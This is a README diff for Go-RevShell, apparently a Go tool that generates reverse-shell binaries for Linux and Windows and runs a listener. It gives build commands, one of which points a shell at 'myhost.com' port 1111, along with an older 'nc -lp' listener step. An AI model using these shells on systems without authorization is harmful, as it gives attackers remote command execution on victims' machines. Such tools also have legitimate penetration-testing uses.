@@ -1,15 +1,55 @@
-# Go-RevShell
+![Go-RevShell-Banner](img/Go-RevShell-Banner.jpeg)
 
-<img src="https://go.dev/images/gophers/pilot-bust.svg" width="200" height="200" align="right">
+Go-RevShell
+=======
 
-## Installation & Usage
+Pure standard Golang implementation of a reverse-shell generator and a tcp listener.
 
-1. Clone the repo `git clone git@github.com:Lucaskrell/go_revshell.git` and get into it `cd go_revshell`
-2. Modify `go_revshell.go` and in the main function set `localhost` to client IP, `1111` to client port
-3. Compile the code using `go build` (adjust the produced file to the server OS using the environment variable GOOS)
-4. Execute the file produced at step 3 server side
-5. Listen to the given port at step 2 client side using `nc -lp <port>`
+## Table of content
+- [Go-RevShell](#go-revshell)
+  - [Table of content](#table-of-content)
+  - [Usage](#usage)
+    - [Build a reverse shell](#build-a-reverse-shell)
+    - [Attach to reverse shell](#attach-to-reverse-shell)
+  - [Screenshots](#screenshots)
+  - [Todo List](#todo-list)
 
-## Screenshot
 
-![Go-RevShell](img/go_revshell.PNG)
+## Usage
+```text
+  -i string
+        IP of the host which the reverse shell will connect to. (default "localhost")
+  -l string
+        Port to listen (you can use this argument to bind to your reverse shell). (default "0")
+  -p string
+        Port of the host which the reverse shell will connect to. (default "1111")
+  -s string
+        OS of the server which will start the reverse shell (used to build the right binary) available : "windows", "linux". (default "linux")
+  -t string
+        Template to use to generate the reverse shell. Available : "native", "tty". (default "native")
+```
+
+### Build a reverse shell
+
+* Build a native shell for linux server : ```go run main.go -s linux```
+* Build a TYY shell for linux server : ```go run main.go -t tty -s linux```
+* Build a TYY shell for linux server, with client ip and port : ```go run main.go -t tty -s linux -i myhost.com -p 1111```
+* Build a native shell for windows server : ```go run main.go -s windows```
+
+### Attach to reverse shell
+
+* Listen to port 1111 ```go run main.go -l 1111```
+* Listen to port 3412 ```go run main.go -l 3412```
+
+## Screenshots
+
+![Go-RevShell-Generate](img/Go-RevShell-Generate.png)
+![Go-RevShell-Attach](img/Go-RevShell-Attach.png)
+
+## Todo List
+
+* More tests across differents os
+* Add Windows payloads for pty
+* Anon screenshots
+
+**[`^        back to top        ^`](#)**
